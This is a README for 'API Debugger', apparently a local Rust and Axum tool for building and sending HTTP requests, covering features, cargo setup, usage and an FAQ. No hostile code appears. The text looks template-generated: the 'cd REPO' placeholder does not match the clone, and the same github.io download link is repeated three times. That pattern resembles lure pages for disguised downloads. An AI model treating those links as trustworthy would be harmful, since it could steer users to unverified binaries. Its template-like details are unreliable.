# API Debugger - API Debugging Tool 2026

> **API Debugger is a browser-based, local-first application for creating, sending, and examining HTTP requests. It combines an Axum and Rust backend with an offline-oriented development workflow.**

[![Platform](https://img.shields.io/badge/Platform-Local%20web%20application-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ckaiser98/api-debugger-tool?style=flat-square)](https://github.com/ckaiser98/api-debugger-tool)

---

<p align="center">
  <a href="https://ckaiser98.github.io/api-debugger-tool/">
    <img src="https://img.shields.io/badge/Download-API%20Debugger%20Latest-brightgreen?style=for-the-badge" alt="Download API Debugger">
  </a>
</p>

> **[Download API Debugger](https://ckaiser98.github.io/api-debugger-tool/)**

---

[Download Latest Build](https://ckaiser98.github.io/api-debugger-tool/)

---

## Overview

API Debugger gives developers a dedicated local workspace for building and testing HTTP requests through a web browser. It covers the commonly used request methods, allows headers and bodies to be changed before sending, and presents JSON responses with formatting and syntax highlighting. This keeps request inspection within the local tool instead of requiring a hosted service.

Its local-first design is suited to repeated API development tasks. Request history makes earlier tests easy to revisit, local storage keeps relevant information on the machine, multithreaded processing supports concurrent work, and proxy support accommodates network setups that require routed requests.

---

## What It Includes

- Create and send `GET`, `POST`, `PUT`, and `DELETE` requests.
- Change headers and body content before a request is submitted.
- Automatically format JSON responses and apply syntax highlighting.
- Browse requests that have already been sent using request history.
- Work through a browser-accessible frontend.
- Retain relevant data locally as part of the local-first workflow.
- Process concurrent work with multithreaded execution.
- Send requests through a configured proxy when necessary.

---

## Getting Started

First, download the source and enter its directory:

```bash
git clone https://github.com/ckaiser98/api-debugger-tool.git
cd REPO
```

Use Cargo to compile and launch the application:

```bash
cargo run
```

Once the server is running, visit the local URL printed in the terminal. The host and port shown there can vary according to the project configuration.

---

## Working with API Debugger

A standard session looks like this:

1. Start API Debugger on your local machine.
2. Visit the address reported by the application in a web browser.
3. Choose a method, for example `GET`, `POST`, `PUT`, or `DELETE`.
4. Provide the API endpoint URL.
5. Add headers and a body if the endpoint needs them.
6. Submit the request and examine the response.
7. Inspect formatted JSON and use history to return to earlier requests.
8. Set up a proxy if your network requires proxy routing.

Common uses include:

- Calling a read endpoint with `GET`.
- Sending JSON payloads through `POST` or `PUT`.
- Reviewing response headers alongside formatted response data.
- Re-running an earlier request from the locally available history.

---

## Local Configuration

API Debugger runs as a local application and is designed to keep request-related data on the local system. Headers, request bodies, and proxy behavior can be adjusted from the web interface wherever those options are exposed.

For example:

```text
Method: POST
URL: https://example.test/api/items
Headers:
  Content-Type: application/json
Body:
  {"name":"example"}
Proxy: optional
```

Avoid placing credentials or other private request information in shared screenshots, logs, or files committed to the repository.

---

## System Requirements

- A system that can run a local web application.
- Rust and Cargo when building from source.
- A current web browser.
- Connectivity to the APIs under test, unless those APIs are running locally.
- Enough storage for the application and locally retained request data.
- Proxy connection details for workflows that use proxy routing.

---

## Frequently Asked Questions

### What kind of user is API Debugger designed for?

API Debugger is aimed at developers and technical users who want to compose HTTP requests and inspect API responses through a local interface.

### Can it be used without an internet connection?

The application itself is local-first and can run locally. Calls to external APIs still need network connectivity; calls made to services running locally can stay within the local environment.

### Where does the application keep request history and settings?

Local data storage is part of the profile's functionality. The active location should be determined from the application interface and the local configuration for the build you are running.

### Is proxy routing supported?

Yes. The application provides proxy support for requests that need to pass through a proxy.

### What can I do if startup fails?

Check that Rust and Cargo are available, execute the command from the project directory, inspect the terminal messages, and make sure the configured local port is not already in use.

### Where can I find newer versions?

Look for newer source updates in the repository, or follow the download link above when a newer build becomes available.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
